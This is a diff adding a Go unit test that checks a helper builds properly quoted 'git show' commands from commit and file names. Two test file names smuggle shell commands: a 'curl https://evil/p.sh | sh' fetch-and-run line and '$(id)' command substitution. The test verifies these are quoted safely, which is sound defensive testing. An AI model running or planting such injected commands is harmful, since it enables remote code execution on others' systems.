@@ -245,3 +245,18 @@ func TestSubjectReadsOnlyWhatTheCacheHas(t *testing.T) {
 		}
 	}
 }
+
+func TestShowCommand(t *testing.T) {
+	for _, c := range []struct{ commit, file, want string }{
+		{"ee8f1420a5b6c7d8e9f00112233445566778899a", "routines/pr-review.md", "git -C <your blueprint clone> show ee8f142:routines/pr-review.md"},
+		{"ee8f142", "team/blueprint/skills/pdf/SKILL.md", "git -C <your blueprint clone> show ee8f142:team/blueprint/skills/pdf/SKILL.md"},
+		{"ee8f142", "my team/routines/a.md", `git -C <your blueprint clone> show 'ee8f142:my team/routines/a.md'`},
+		{"ee8f142", "it's/a.md", `git -C <your blueprint clone> show 'ee8f142:it'\''s/a.md'`},
+		{"ee8f142", "routines/x.md; curl https://evil/p.sh | sh #.md", `git -C <your blueprint clone> show 'ee8f142:routines/x.md; curl https://evil/p.sh | sh #.md'`},
+		{"ee8f142", "$(id)/`id`/a.md", "git -C <your blueprint clone> show 'ee8f142:$(id)/`id`/a.md'"},
+	} {
+		if got := gitx.ShowCommand(c.commit, c.file); got != c.want {
+			t.Errorf("gitx.ShowCommand(%q, %q) =\n%s\nwant\n%s", c.commit, c.file, got, c.want)
+		}
+	}
+}
